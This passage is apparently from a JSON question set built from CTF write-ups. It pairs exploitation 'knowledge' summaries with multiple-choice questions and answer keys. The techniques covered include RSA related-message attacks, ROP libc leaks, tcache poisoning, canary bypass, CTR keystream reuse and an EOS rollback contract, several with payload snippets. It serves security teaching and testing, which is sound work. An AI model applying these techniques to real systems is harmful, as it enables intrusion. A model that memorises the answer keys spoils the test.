            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 201,
        "max_score": 906,
        "difficulty": 0.22185430463576158,
        "knowledge": [
            "When dealing with RSA encryption challenges where two messages are encrypted with a similar method but with slight variations (e.g., different padding), Coppersmith's short pad attack can be utilized if the length of the padding is known. This attack allows for the extraction of the plaintext when the difference in padding between the two messages is short, in this scenario, 128 bits due to the usage of MD5 hashing for padding. This method is particularly useful when you have enough information about the padding's length and properties.",
            "In scenarios where two related messages are encrypted (e.g., they differ by a known modification or padding), applying the Franklin-Reiter Related Message Attack is effective. This requires knowledge of how the messages are related and the RSA modulus. If the difference or relation between the two messages can be succinctly expressed, this attack can reveal the original plaintexts without requiring the decryption key. This method is highly effective for closely related messages, especially when one message is a known alteration of the other.\n\nExample related knowledge for Franklin-Reiter Related Message Attack:\n```python\n# Assuming e = 3, N is the RSA modulus, C1 and C2 are the ciphertexts\nR.<x> = PolynomialRing(Zmod(N))\nf1 = x^3 - C1\nf2 = (x + diff)^3 - C2\nresult = f1.resultant(f2)\nroots = result.roots()\nFlag = roots[0][0] - diff\n```"
        ],
        "question": [
            "In the context of applying Coppersmith's Short Pad Attack for RSA encrypted messages where MD5 is used for padding, which of the following best describes the role of the given length of the padding?  - A. It defines the maximum size of the plaintext that can be securely encrypted. - B. It determines the polynomial degree used in the RSA encryption function. - C. It specifies the exact value to be used for the `X` parameter in the `small_roots()` function to identify the difference between plaintexts. - D. It indicates the size of the encryption key required for secure communication. ",
            "When executing the Franklin-Reiter Related Message Attack against RSA encrypted messages that are related by a known difference, what is essential for the attack to succeed?  - A. Increasing the encryption key length to prevent brute force attacks. - B. Knowing the exact value of the RSA modulus `N` and being able to express the difference between the messages effectively. - C. Applying a high degree polynomial to ensure the encryption scheme is non-linear. - D. Using a separate key for each message to increase the complexity of the ciphertext. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Double Miff",
        "write_up": "dataset/raw/Double Miff.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 217,
        "max_score": 477,
        "difficulty": 0.4549266247379455,
        "knowledge": [
            "When facing a challenge involving elliptic curves with a non-standard curve equation and unknown parameters, analyzing the associative and commutative properties of the elliptic curve's addition law can lead to relationships between known points on the curve. This approach helps in deducing the curve's modulus \\(p\\) by setting up equations based on the given point additions (\\(P + Q\\), \\(Q + Q\\), \\(P + P\\)), and then computing the greatest common divisor (gcd) of derived expressions to find a multiple of \\(p\\).",
            "In challenges where the flag is embedded within coordinates of points on an elliptic curve, one can recover these coordinates by first deducing the curve's modulus \\(p\\), then exploiting specific relationships between the points and the modulus to compute potential coordinates. This involves determining the quotient \\(\\frac{a}{b}\\) from the curve's defining equation, and using square roots modulo \\(p\\) to solve for the coordinates. Special attention should be given to the fact that \\(p\\) is a prime congruent to 3 mod 4, which simplifies computation of square roots modulo \\(p\\)."
        ],
        "question": [
            "In a cryptographic challenge involving elliptic curves, given the point operations $P + Q$, $Q + Q$, and $P + P$, which of the following methods can be used to calculate a multiple of the elliptic curve's modulus $p$?  - A. Calculate the determinant of a matrix composed of the coordinates of $P$, $Q$, and $P+Q$. - B. Compute the greatest common divisor (gcd) of expressions derived from the elliptic curve's addition law. - C. Directly solve a system of linear equations based on the coordinates of $P$, $Q$, and their additions. - D. Use the Chinese Remainder Theorem on the sums of the coordinates. ",
            "When trying to recover the flag from a cryptographic challenge where the flag is encoded in the coordinates of points on an elliptic curve with an unknown modulus $p$, what step is crucial for solving for the points' coordinates?  - A. Applying the Fast Fourier Transform to the given points to find $p$. - B. Using the Euler totient function to directly calculate the points' coordinates. - C. Calculating square roots modulo $p$, taking advantage of the fact that $p \\equiv 3 \\mod 4$. - D. Implementing the Rabin-Karp algorithm to search for potential coordinates within a large dataset. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "doubletrouble",
        "write_up": "dataset/raw/doubletrouble.md",
        "type": "pwn",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 200,
        "max_score": 1285,
        "difficulty": 0.1556420233463035,
        "knowledge": [
            "In scenarios involving exploitation of a program that interacts with input as floating-point numbers, an attacker can manipulate the program's memory layout, specifically targeting stack buffers for arbitrary code execution. This can be achieved by carefully crafting input sequences that extend array boundaries and overwrite critical memory segments, such as the return address, while ensuring that the input values comply with the floating-point format, thereby executing shellcode stored on the stack.",
            "To bypass stack canaries in binary exploitation challenges where the application's memory layout includes stack canaries for security, an approach can be to maintain the canary's integrity by sorting input values such that the canary remains undisturbed. This requires an understanding of the underlying binary format for floating-point numbers and how they are organized in memory to ensure that during the exploit, the values injected do not trigger stack canary checks. This technique may involve the strategic placement of shellcode and manipulation of the stack to control the flow of execution without directly overwriting the canary.\n\nA specific sample of payload or direct extraction to a universal format is not feasible due to the detailed nature and complexity of the described exploitation method. The methodology involves intricate manipulation of floating-point numbers and memory layout which cannot be succinctly captured in a single payload example."
        ],
        "question": [
            "When exploiting a program that uses floating-point numbers to interact with input, allowing arbitrary code execution through stack buffer manipulation, which of the following best describes a method to execute shellcode stored on the stack? - A. Overwrite the floating-point numbers directly using integer values to corrupt the stack and execute shellcode. - B. Use a sequence of crafted floating-point inputs to extend array boundaries and overwrite the return address with the shellcode's address while complying with the floating-point format. - C. Inject ASCII-encoded commands directly into the floating-point inputs to bypass input validation and execute shellcode. - D. Increase the size of floating-point inputs to overflow the buffer directly and trigger shellcode execution without regard for the floating-point format.",
            "In a binary exploitation challenge involving stack canaries, where the memory layout includes these canaries for security, which approach is valid for bypassing stack canary protection without triggering a stack canary check? - A. Overwrite the stack canary with a sequence of zero-bytes to neutralize its effect and gain control of the stack for arbitrary code execution. - B. Use a buffer overflow to directly overwrite the return address, bypassing the stack canary by avoiding memory areas protected by it. - C. Maintain the integrity of the stack canary by ensuring it remains undisturbed through careful sorting of injected values, to control the flow of execution without directly altering the canary. - D. Decrypt the stack canary value at runtime by brute-forcing its value, then use it in the payload to overwrite the stack without detection."
        ],
        "answer": [
            "B. Use a sequence of crafted floating-point inputs to extend array boundaries and overwrite the return address with the shellcode's address while complying with the floating-point format.",
            "C. Maintain the integrity of the stack canary by ensuring it remains undisturbed through careful sorting of injected values, to control the flow of execution without directly altering the canary."
        ]
    },
    {
        "name": "dreams",
        "write_up": "dataset/raw/dreams.md",
        "type": "pwn",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 210,
        "max_score": 250,
        "difficulty": 0.84,
        "knowledge": [
            "For heap exploitation challenges, altering global variables related to program functionality can enable the allocation of a large number of chunks. This can be particularly useful for facilitating arbitrary write operations or for crafting fake chunks when combined with a heap leak. This approach requires knowing the address of the global variable and having a mechanism (like a write-what-where condition) to modify its value. An example of altering a global variable to affect heap behavior involves setting a large value to a variable that controls the maximum number of allowable dynamic allocations, effectively bypassing allocation size restrictions.",
            "A heap leak can be utilized to bypass security mechanisms and facilitate arbitrary memory write operations using tcache poisoning. Once a heap address is leaked, it's possible to calculate the base address of the heap and manipulate heap metadata to perform arbitrary writes. This can be achieved by freeing chunks in a specific order to poison the tcache list, followed by reallocating chunks to overwrite pointers or metadata such as size fields of subsequent chunks. This strategy is particularly effective in heap exploitation challenges where direct memory overwrites are restricted or where the layout of the heap is initially unknown."
        ],
        "question": [
            "In a heap exploitation challenge, which of the following approaches is used to circumvent restrictions on the number of dynamic allocations and facilitate arbitrary write operations or fake chunk crafting? - A. Modifying a local variable's value to change the program's control flow at runtime. - B. Altering a global variable related to program functionality, specifically one controlling allocation size limits, to enable the allocation of a large number of chunks. - C. Directly editing the heap's metadata using an out-of-bounds write vulnerability without altering any variables. - D. Injecting shellcode into the heap to override memory allocation functions (e.g., malloc, free). ",
            "Which technique allows for bypassing memory security restrictions and performing arbitrary writes in a heap exploitation scenario? - A. Utilizing a stack overflow to overwrite the return address and bypass NX protections. - B. Exploiting an integer overflow to allocate a large buffer and perform a buffer overflow. - C. Performing a Return-to-libc attack to execute system functions without needing a heap leak. - D. Using a heap leak to calculate the heap's base address and manipulate heap metadata for arbitrary writes via tcache poisoning. "
        ],
        "answer": [
            "B. Altering a global variable related to program functionality, specifically one controlling allocation size limits, to enable the allocation of a large number of chunks.",
            "D. Using a heap leak to calculate the heap's base address and manipulate heap metadata for arbitrary writes via tcache poisoning."
        ]
    },
    {
        "name": "dROPit",
        "write_up": "dataset/raw/dROPit.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 300,
        "max_score": 800,
        "difficulty": 0.375,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in challenges where NX is enabled but PIE and canary checks are disabled, it is effective to leverage Return Oriented Programming (ROP) to bypass NX. The first step involves finding a `pop rdi; ret` gadget for controlling the contents of the RDI register (used for the first function argument in x86_64 calling conventions), followed by leaking a libc function address (e.g., `puts`) to calculate libc's base address. This method is applicable for leaking addresses to defeat ASLR and execute a second stage payload that may involve calling `execve(\"/bin/sh\", NULL, NULL)`.\n    - Example payload segment: \n    ```\n    payload = 'A' * buffer_overflow_offset\n    payload += p64(POP_RDI)  \n    payload += p64(PUTS_GOT)  \n    payload += p64(PUTS_PLT)  \n    payload += p64(MAIN)  \n    ```",
            "To accurately leak libc's base address for exploitation, one can utilize the Procedure Linkage Table (PLT) and Global Offset Table (GOT) entries of already imported functions (such as `puts`) to leak their real addresses at runtime. This leaked address can then be used with tools or databases like https://libc.rip to identify the exact libc version and calculate the base address of libc. With libc's base discovered, an attacker can reliably call any libc function, including `system()`, to achieve remote code execution.\n    - An approach to utilize these addresses involves crafting a ROP chain that (1) set the first argument (RDI) with the address of a GOT entry (e.g., `puts@got`) to be leaked by calling a corresponding PLT entry (e.g., `puts@plt`), and (2) returns to `main` or another location that reads user input to permit a second payload execution with the now-known libc base address."
        ],
        "question": [
            "When aiming to perform a buffer overflow in a binary with NX enabled and PIE and Canaries disabled, which of the following gadgets is crucial for setting up the first function argument before calling a function such as `puts` to leak an address?  - A. `push rdi; ret` - B. `jmp rsp` - C. `pop rsi; ret` - D. `pop rdi; ret` ",
            "In a scenario where an attacker needs to leak the address of `puts` to defeat ASLR and gain execution control via ROP chain, which of the addresses is used in combination with `puts@plt` to achieve this goal?  - A. The address of `stdin@got` - B. The address of `stdout@got` - C. The address of `puts@got` - D. The address of `fgets@got` "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Duality",
        "write_up": "dataset/raw/Duality.md",
        "type": "crypto",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "For challenges involving prime numbers and arithmetic combinations like $a_{i}p+b_{i}$, one effective approach to solving is to use the approximate greatest common divisor (AGCD) technique. This process involves obtaining several samples that follow the form $a_{i}p+b_{i}$ and using combinations of these samples to probabilitically recover the prime number $p$. This method is particularly useful when dealing with a relatively small number of samples that are generated by a process that includes prime numbers in their structure.",
            "When dealing with Linear Feedback Shift Registers (LFSRs) combined with Linear Congruential Generators (LCGs) as part of a Pseudo-Random Number Generator (PRNG), and the task is to recover the initial seed, one can exploit the characteristics of the LFSR's behavior. Specifically, if the LCG component is significantly biased or shows predictable output, the PRNG's sequence might be simplified to primarily LFSR behavior, simplifying the seed recovery process. Information Set Decoding (ISD) can be applied for key recovery by solving an instance of the low-density parity-check (LDPC) problem which is faster than brute-force or more complex algebraic methods when the error rate is low and the number of samples is limited.\n\nExample payload snippet to utilize LFSR behavior for seed recovery:\n```python\nclass symLFSR:  \n   def __init__(self, seed):  \n       self.state = list(seed)  \n       self.taps = [0, 16, 32, 64, 96, 127]\n\n   def get(self):  \n       next_bit = 0  \n       for tap in self.taps:  \n           next_bit += self.state[tap]  \n       self.state = self.state[1:] + [next_bit]  \n       return next_bit\n```"
        ],
        "question": [
            "In the context of distinguishing between numbers sampled uniformly at random and numbers of the form $a_{i}p + b_{i}$, which method is best suited for probabilistically recovering the prime number $p$ from a set of samples?  - A. Employing an exhaustive search method by iterating over all possible prime numbers until a match is found. - B. Using the approximate greatest common divisor (AGCD) technique to process combinations of samples and recover $p$. - C. Applying Fast Fourier Transform (FFT) to identify periodic patterns that correlate with the prime number $p$. - D. Implementing a sieve algorithm to filter out non-prime numbers from the set of samples. ",
            "When given a Pseudo-Random Number Generator (PRNG) that combines a Linear Feedback Shift Register (LFSR) with a biased Linear Congruential Generator (LCG), which approach is efficient for recovering the initial seed of the PRNG?  - A. Utilizing a quantum computing algorithm to find the seed by exploiting superposition properties. - B. Applying the Information Set Decoding (ISD) method to solve a low-density parity-check (LDPC) problem for seed recovery. - C. Conducting a Monte Carlo simulation to randomly guess the seed until it matches the observed output pattern. - D. Making use of differential cryptanalysis to exploit the bias in the LCG component and deduce the seed. "
        ],
        "answer": [
            "B. Using the approximate greatest common divisor (AGCD) technique to process combinations of samples and recover $p$.",
            "B. Applying the Information Set Decoding (ISD) method to solve a low-density parity-check (LDPC) problem for seed recovery."
        ]
    },
    {
        "name": "Dungeon Escape",
        "write_up": "dataset/raw/Dungeon Escape.md",
        "type": "pwn",
        "competition": [
            "FireShell/2020",
            "https://ctftime.org/event/944/tasks/"
        ],
        "score": 472,
        "max_score": 500,
        "difficulty": 0.944,
        "knowledge": [
            "When solving problems involving finding the shortest paths in graphs with vertices representing states and edges representing possible transitions where conditions apply (like doors opening at certain times), Dijkstra's algorithm can be modified to accommodate these conditions. Specifically, when you reach a vertex at time $x$ and the edge (or door) opens at an interval $t$, adjust the time to wait for the door to open by using the formula $\\left\\lceil \\frac{x}{t} \\right\\rceil t$, which calculates the next opening time that is greater than or equal to $x$.",
            "To automate interaction with servers for challenges requiring real-time input and output processing, a combination of a compiled solver (for computational efficiency) and a scripting language like Python can be used. The scripting part can handle network communications, parse challenge inputs, feed them to the solver, and then read and send the solver's output back to the server. This approach is efficient for challenges that consist of multiple rounds or require dynamic input/output handling.\n\nExample Python script snippet for server interaction:\n```python\nfrom pwn import *\n\nr = remote('example.com', 12345)  \nr.sendlineafter('prompt: ', 'command')\n\n# Read challenge input from the server\ninput_data = r.recvuntil('Input end signal').decode()\n\n# Assume the solver is a separate executable\nsol = process('./solver')\nsol.send(input_data)  # Send the challenge input to the solver\n\n# Get the solver's output and send it back to the server\noutput_data = sol.recvline()\nr.send(output_data)  \n\nresult = r.recvline().decode()\nif 'Correct' in result:  \n    print('Solution accepted')\nelse:  \n    print('Solution rejected')\n```"
        ],
        "question": [
            "When applying Dijkstra's algorithm to a problem where you must calculate the shortest path in a graph, and nodes represent doors that open at fixed intervals, how should you adjust the arrival time at a node if the door opens at time $t$ and you arrive at time $x$? - A. Use the formula $t - (\\frac{x}{t} - \\left\\lfloor \\frac{x}{t} \\right\\rfloor) t$ to calculate the waiting time. - B. Apply the formula $\\left\\lceil \\frac{x}{t} \\right\\rceil t$ to find the next opening time. - C. Simply add $t$ to $x$ until the result is a multiple of $t$. - D. Divide $x$ by $t$, round up to the nearest whole number, and multiply by $t$ again.",
            "In a Capture The Flag (CTF) challenge that requires real-time interaction with a server, which combination of tools and languages is effective for dynamically handling the input/output, including parsing server responses and executing a solver algorithm? - A. Utilizing a Java application for network communication and a Bash script for solving algorithms. - B. Employing a PHP web script for solver execution and JavaScript for parsing server responses. - C. Implementing a C# program to interact with the server and using SQL queries to process server responses. - D. Combining a Python script for server communication with a compiled program (e.g., C++ executable) for efficient computation and solving."
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "dyrpto",
        "write_up": "dataset/raw/dyrpto.md",
        "type": "crypto",
        "competition": [
            "PlaidCTF/2020",
            "https://ctftime.org/event/936/tasks/"
        ],
        "score": 250,
        "max_score": 550,
        "difficulty": 0.45454545454545453,
        "knowledge": [
            "When facing RSA encryption with a short padding scheme, consider using Coppersmith's short pad attack, especially if the scenario includes manipulating minor details like serial numbers or incrementing IDs affecting the plaintext. This method is applicable when the difference between plaintexts is tiny but known, and the padding added to the message is insufficiently secure (less than the key size). The approach involves constructing a polynomial equation reflecting the difference between the encrypted messages and solving for the roots to reveal this difference, thereby compromising the encryption. \n\n   - Example of constructing polynomial equations for the attack: \n     ```python\n     PRxy.<x,y> = PolynomialRing(Zmod(N))\n     g1 = x ** e - ct1\n     g2 = (x + y + (1 << (2152 + 192))) ** e - ct2\n     ```",
            "For scenarios where two plaintexts encrypted under the same RSA key are closely related, the Franklin-Reiter related message attack can be applied to recover these plaintexts. This attack technique is especially useful when there's a known relation or difference between two messages, such as a fixed offset. The strategy involves using the relation between these messages to construct corresponding polynomial equations and finding their greatest common divisor (GCD), which will often yield the original messages.\n\n   - Example of recovering plaintext using Franklin-Reiter related message attack:\n     ```python\n     x = PRx.gen()\n     g1 = (x + (1 << (2152 + 192))) ** e - ct1\n     g2 = (x + diff) ** e - ct2\n\n     # gcd  \n     while g2:  \n        g1, g2 = g2, g1 % g2\n\n     g = g1.monic()\n     assert g.degree() == 1\n\n     msg = -g[0]\n     ```"
        ],
        "question": [
            "In an RSA encryption scenario where a short padding vulnerability exists, you decide to use Coppersmith's short pad attack. Given a situation where two ciphertexts differ due to a minor difference in their plaintexts (such as an incremented ID), which step is crucial for adjusting the polynomial equations for this attack?  - A. Multiply the second polynomial by the incremental difference. - B. Add a fixed value to the first polynomial to compensate for serialization length. - C. Embed the known difference between plaintexts into the polynomial equation as a variable. - D. Embed an adjustment for the padding and known plaintext length difference directly into the second polynomial equation. ",
            "When applying the Franklin-Reiter related message attack to two RSA-encrypted messages with a known difference, what is a critical step in the process of recovering the original messages?  - A. Calculating the greatest common divisor (GCD) of two specially constructed polynomials that reflect the relationship between the messages. - B. Encrypting both messages with an incremented key to reveal the fixed offset. - C. Subtracting the smaller ciphertext from the larger one to find the difference. - D. Multiplying the ciphertexts together to cancel out the known difference. "
        ],
        "answer": [
            "D",
            "A"
        ]
    },
    {
        "name": "e",
        "write_up": "dataset/raw/e.md",
        "type": "misc",
        "competition": [
            "0CTF/2023",
            "https://ctftime.org/event/2073/tasks/"
        ],
        "score": -1.0,
        "max_score": 664,
        "difficulty": -1,
        "knowledge": [
            "When solving integer overflow challenges involving type casting, input values can be precisely crafted to exploit the overflow. Specifically, for a 16-bit data type casting scenario, if an input is stored as a `float` and then cast to an `unsigned short`, providing an input value that overflows the `unsigned short` range and wraps around to the target value can be a successful strategy. For instance, inputting `65538` exploits the overflow to wrap around and effectively become `2` since `65538` overflows the `unsigned short` max value (`0xFFFF` or `65535`) by `3`, resetting to `2`. Example payload: `65538`.",
            "In challenges involving floating-point precision issues, providing an input that compensates for the floating-point imprecision can lead to bypassing equality checks. When the task is to adjust a sum to a precise value (like making the total exactly `1.0` when added to `0.9`), consider floating-point representation inaccuracies. For example, instead of adding `0.1` to `0.9`, which due to floating-point arithmetic could result in a value slightly over `1.0`, providing an input slightly less than the mathematically exact amount needed (like `0.0999999`) can exactly achieve the desired total due to the way floating-point numbers are represented in computers. Example payload: `0.0999999`.",
            "For challenges involving operations with arrays and randomness where the objective is to manipulate the sum of the array elements, using extreme values can be an effective method to counteract unknowns introduced by random values. If the challenge is structured such that after user input, random float values within a defined range are added to an array, and the goal is to make the final sum zero, inputting a large positive value followed by a large enough negative value to counterbalance both the initial large positive value and the sum of random values can manipulate the total sum effectively back to zero. This strategy exploits the limited impact of relatively small random values against significantly large user-provided inputs. Example payload: Initial input: `30000000000`, Final input: `-30000000000`."
        ],
        "question": [
            "When addressing a challenge that requires bypassing a condition by exploiting an integer overflow via type casting, the scenario involves inputting a number as `float` and then casting it to `unsigned short`. Given the task to make the input effectively equal `2` through overflow manipulation, which of the following input values should be provided to exploit the type casting overflow, considering the `unsigned short` has a maximum value of `65535`? - A. 65536 - B. 65537 - C. 65538 - D. 2",
            "In a floating-point precision challenge where the goal is to correct a summation operation that due to floating-point inaccuracy ends up slightly over the intended target (e.g., making `0.9 + x = 1.0` exactly), considering the inherent imprecision of floating-point representation in computers, which input value below logically compensates for this issue? - A. 0.1 - B. 0.0999999 - C. 1.0 - D. 0.9"
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "EaCy",
        "write_up": "dataset/raw/EaCy.md",
        "type": "crypto",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 979,
        "max_score": 1000,
        "difficulty": 0.979,
        "knowledge": [
            "For RSA encryption schemes based on univariate polynomials over a finite field (Zp), finding the multiplicative order of the group formed by residue polynomials of a given modulus is crucial. This can be achieved by factorizing the modulus into its irreducible polynomials, determining their degrees, and applying the specific formula \\(s = (p^{d1} - 1) \\times (p^{d2} - 1)\\), where \\(d1\\) and \\(d2\\) are the degrees of the irreducible polynomials, and \\(p\\) is a prime number. This method allows for the inversion of the encryption exponent \\(e\\) and decryption of the ciphertext polynomial to reveal the message.",
            "In challenges involving the discrete logarithm problem in the context of polynomials over finite fields (Zp[x]), if the modulus polynomial factors into small-order groups, the Pohlig-Hellman algorithm can be effectively used. This approach involves factorizing the order of the group into small primes and solving the discrete logarithm modulo each prime factor, then combining these results using the Chinese Remainder Theorem (CRT). To ensure effectiveness, select primes for which the base element does not give the identity element when raised to the order divided by the prime power. This technique is especially useful when the discrete logarithm's factors include many small primes and the solution domain is within bruteforceable range."
        ],
        "question": [
            "In a cryptographic challenge utilizing RSA encryption with univariate polynomials over a finite field \\(Zp\\), given the modulus \\(n\\) factorized into two irreducible polynomials with degrees \\(d1\\) and \\(d2\\), and a prime number \\(p\\), what formula is used to find the multiplicative order of the residue polynomials' group? - A. \\(s = p^{(d1 + d2)} - 1\\) - B. \\(s = (p^{d1} - 1) \\times (p^{d2} - 1)\\) - C. \\(s = (p^{d1 + d2}) - 2\\) - D. \\(s = p^{(d1 \\times d2)} - 1\\) ",
            "In the scenario of solving a discrete logarithm problem in a polynomial group over a finite field, when given a modulus that factors into small-order groups, which algorithm is particularly effective, and under what conditions does this approach become feasible? - A. Fermat's Little Theorem, when the exponent is large. - B. Euclidean Algorithm, when the modulus is a prime number. - C. Pohlig-Hellman Algorithm, when the group's order has many small prime factors. - D. Fast Fourier Transform, when dealing with polynomials of high degree. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "EAR Piercing",
        "write_up": "dataset/raw/EAR Piercing.md",
        "type": "pwn",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": 500,
        "max_score": 700,
        "difficulty": 0.7142857142857143,
        "knowledge": [
            "For challenges involving custom architectures and buffer overflow vulnerabilities, understanding the specific assembly instructions and manipulation required to exploit the architecture is crucial. This can include using unique instructions to influence control flow or manipulate memory directly. Exploit development can significantly benefit from a deep dive into the architecture's documentation and utilizing debuggers to inspect memory and control flow at runtime.",
            "In scenarios where the target architecture or environment employs non-standard mechanisms for data handling (e.g., string termination not by null bytes but by specific bit patterns), crafting payloads that adhere to these peculiarities is essential for successful exploitation. This may involve altering payload content dynamically based on how the architecture processes or modifies data in memory. An example payload adjustment could be altering a buffer underflow exploit to modify the virtual table's page permissions, enabling execution on normally non-executable pages through strategic input crafting, demonstrated by changing virtual page table permissions to execute shellcode stored on the stack."
        ],
        "question": [
            "In a scenario involving a custom architecture where traditional buffer overflow techniques might not directly apply due to a unique assembly instruction set, which of the following best describes an effective approach to gain arbitrary code execution? - A. Utilize a debugger to step through each instruction manually, ensuring the modification of the stack pointer directly to control the execution flow. - B. Focus solely on finding a gadget that allows for an indirect jump or call, disregarding the peculiarities of the architecture's instruction set. - C. Identify unique assembly instruction(s), such as a conditional pop that can set crucial registers, enabling the manipulation of control flow based on the architecture\u2019s specific behavior. - D. Overwrite the return address with a known libc function address without considering the architecture's unique execution or memory model. ",
            "In an exploitation challenge where string termination is handled via a specific bit pattern rather than null bytes, thus affecting how payloads are processed in memory, which approach is vital for crafting a successful exploit? - A. Neglecting the architecture's data handling mechanism and proceeding with typical payload crafting methods that include null bytes as terminators. - B. Dynamically altering the exploit payload to account for architecture-specific data modifications, such as adding a particular bit mask to the payload characters to meet string termination criteria. - C. Focusing on stack overflow without tailoring the payload to the unique string handling, assuming that default C string functions will process input data. - D. Utilizing a generic return-to-libc attack as is, without adapting the exploit to the specific mechanism by which the target architecture signifies the end of strings. "
        ],
        "answer": [
            "C. Identify unique assembly instruction(s), such as a conditional pop that can set crucial registers, enabling the manipulation of control flow based on the architecture\u2019s specific behavior.",
            "B. Dynamically altering the exploit payload to account for architecture-specific data modifications, such as adding a particular bit mask to the payload characters to meet string termination criteria."
        ]
    },
    {
        "name": "easter egg",
        "write_up": "dataset/raw/easter egg.md",
        "type": "web",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 25,
        "max_score": 1000,
        "difficulty": 0.025,
        "knowledge": [
            "When searching for hidden elements within the source code of a website, consider focusing on unique characters associated with the flag format (such as `{`, `}` for CTFs where the flag format is `fb{some_text_here}`). This can help narrow down the search area and uncover parts of the flag scattered across different sections of the site.",
            "To reconstruct a flag that is hidden in pieces throughout a website's source code, a Python script utilizing regular expressions can be employed. This script searches for and extracts characters or strings wrapped in specific HTML tags (e.g., `<span>`) and then concatenates them to form the complete flag. An example Python script for this scenario is:\n```python\nimport re\ntext = open(\"source_file.html\", 'r').read()\ntext = re.findall('''<span>(.)</span>''', text)\nprint(''.join(text))\n```"
        ],
        "question": [
            "When trying to find a hidden flag on a website, which approach is most effective if the flag follows a specific format such as `fb{some_text_here}`? - A. Reviewing the website's terms and conditions for hints about the flag's location. - B. Focusing your search on unique characters associated with the flag format, like `{` and `}`, to uncover parts of the flag scattered across different sections of the site. - C. Emailing the webmaster to ask for clues about the flag's whereabouts. - D. Using a brute force attack to try and guess the flag's value. ",
            "To aggregate a flag that is dispersed in fragments within a website's HTML source code, which Python script approach is the most appropriate? - A. Writing a script that uses BeautifulSoup to parse the entire HTML document for `<div>` tags. - B. Using a script that employs regular expressions to search for characters or strings within `<p>` tags, then gluing them together. - C. Creating a script that leverages regular expressions to find and amalgamate characters or strings enclosed in specific HTML tags like `<span>`, reconstructing the full flag. - D. Developing a script that randomly selects HTML tags in hopes of finding flag fragments stored within. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "easy as 123",
        "write_up": "dataset/raw/easy as 123.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "UMassCTF/2021",
            "https://ctftime.org/event/1282/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing network traffic in CTF challenges, especially with numerous packets, first filter out common traffic (like DNS, HTTPS, NTP, ARP, etc.) to narrow down potential leads. This step simplifies identifying suspicious or anomalous activities by reducing noise and focusing on non-standard ports or protocols, unusual packet sizes, or specific IP addresses.\n   - For Wireshark, use filters like `dns` to inspect domain queries, `not tcp.port == 443` to exclude HTTPS traffic, or `ip.addr==[target IP address]` to focus on traffic to or from a particular host.",
            "In scenarios involving encrypted payload analysis, if the encryption scheme involves a counter (CTR mode), and you identify a pattern in the counter use or a common starting sequence across different packets, you can exploit this by XORing the known plaintext with encrypted packets sharing the same counter value to derive the keystream. This derived keystream can then be used to decrypt other packets with the same counter value, potentially revealing hidden messages or commands.\n   - Example analysis process involves capturing payloads exhibiting a known command structure (e.g., `--help`, `getflg`) where a consistent counter byte is observed. Use the relationship `plaintext XOR ciphertext = keystream` on packets with a known plaintext to derive the keystream, which can then be applied to decrypt other encrypted messages using the same keystream by reversing the XOR process."
        ],
        "question": [
            "When trying to analyze network traffic in a CTF challenge that contains 38,651 packets, which of the following filters would NOT be beneficial initially to reduce noise and find potentially malicious activity? - A. Using `dns` to inspect domain queries. - B. Applying `not tcp.port == 443` to exclude HTTPS traffic. - C. Filtering with `ip.addr==192.168.1.19` to focus on traffic from a suspicious IP address. - D. Filtering out all UDP traffic to focus solely on TCP traffic. ",
            "In the process of decrypting encrypted traffic using CTR mode, once you have identified a common counter byte across multiple packets, how should you proceed to decrypt packets with unknown plaintext? - A. Use the identified counter byte to modify packet sizes and break the encryption algorithm. - B. XOR the ciphertext of packets with matching counter bytes with the ciphertext of packets without matching counter bytes. - C. Compute the keystream from a packet with a known plaintext and a matching counter byte, then XOR this keystream with the ciphertext of packets with the same counter byte to decrypt them. - D. Change the counter byte in each encrypted packet to a neutral value like `\\x00` before attempting any decryption process. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Easy EOS",
        "write_up": "dataset/raw/Easy EOS.md",
        "type": "misc",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 869,
        "max_score": 952,
        "difficulty": 0.9128151260504201,
        "knowledge": [
            "In EOS blockchain-based CTF challenges, if the challenge involves making predicative actions (like betting) where the outcome affects the participant's ability to continue, a *Roll Back* attack can be used. By deploying a smart contract that performs the action and checks the result in a single transaction, one can exploit the atomicity of transactions. If the action does not result in a desirable outcome, the transaction can be programmed to fail (throw an exception), which rolls back any changes made during the transaction. This ensures the participant's ability to attempt the action multiple times without being locked out due to a failure.  \n**Sample payload**:  \n```\ncleos set account permission [your_account] active '{\"threshold\": 1,\"keys\": [{\"key\": \"[your_key]\",\"weight\": 1}],\"accounts\":[{\"permission\":{\"actor\":\"[your_account]\",\"permission\":\"eosio.code\"},\"weight\":1}]}'\ncleos set contract [your_account] . -p [your_account]@active  \ncleos push action [your_account] makebet '[]' -p [your_account]@active  \n```",
